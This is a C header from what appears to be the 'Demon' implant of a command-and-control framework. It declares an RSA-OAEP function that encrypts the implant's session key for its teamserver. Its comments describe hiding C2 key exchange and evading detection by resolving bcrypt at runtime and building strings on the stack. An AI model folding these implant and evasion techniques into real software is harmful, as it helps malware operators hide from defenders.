#ifndef DEMON_RSACRYPT_H
#define DEMON_RSACRYPT_H

#include <Demon.h>

/*
 * [HVC-005 2026-03-28] RSA-2048-OAEP-SHA256 key wrapping for the registration
 * packet.  The Demon generates a random 48-byte AES session key material block
 * (32-byte key + 16-byte IV) and encrypts it with the teamserver's RSA-2048
 * public key before transmitting the registration packet.  This prevents the
 * AES session key from appearing in plaintext on the wire.
 *
 * The teamserver's public key is supplied as SERVER_PUBKEY_BLOB — a compiler
 * -D define whose value is a BCRYPT_RSAPUBLIC_BLOB byte array literal (283
 * bytes, see TrafficImprovements.md §5).
 *
 * The BCrypt API is resolved at runtime via LdrLoadDll + LdrGetProcedureAddress
 * to avoid an explicit bcrypt.dll import entry.  Wide strings needed for
 * LdrLoadDll are built on the stack to avoid static Unicode literals.
 */

/* Total size of a BCRYPT_RSAPUBLIC_BLOB for RSA-2048 (24 header + 3 exp + 256 mod). */
#define RSA_PUBKEY_BLOB_LEN  283

/* Length of the RSA-2048 OAEP ciphertext output. */
#define RSA_CIPHERTEXT_LEN   256

/*!
 * @brief
 *  Encrypt PlainText using RSA-2048-OAEP-SHA256 with the given public key blob.
 *
 *  On success, writes exactly RSA_CIPHERTEXT_LEN (256) bytes to CipherText.
 *  Loads bcrypt.dll via LdrLoadDll and resolves BCrypt* functions at runtime.
 *
 * @param PubKeyBlob  Pointer to a BCRYPT_RSAPUBLIC_BLOB (RSA_PUBKEY_BLOB_LEN bytes).
 * @param PubKeyLen   Must equal RSA_PUBKEY_BLOB_LEN (283).
 * @param PlainText   Data to encrypt (≤ 190 bytes for RSA-2048-OAEP-SHA256).
 * @param PlainLen    Number of bytes in PlainText.
 * @param CipherText  Output buffer; must be at least RSA_CIPHERTEXT_LEN bytes.
 *
 * @return TRUE on success, FALSE on any BCrypt or allocation failure.
 */
BOOL RsaOaepEncrypt(
    _In_  PUCHAR PubKeyBlob,
    _In_  ULONG  PubKeyLen,
    _In_  PUCHAR PlainText,
    _In_  ULONG  PlainLen,
    _Out_ PUCHAR CipherText
);

#endif /* DEMON_RSACRYPT_H */
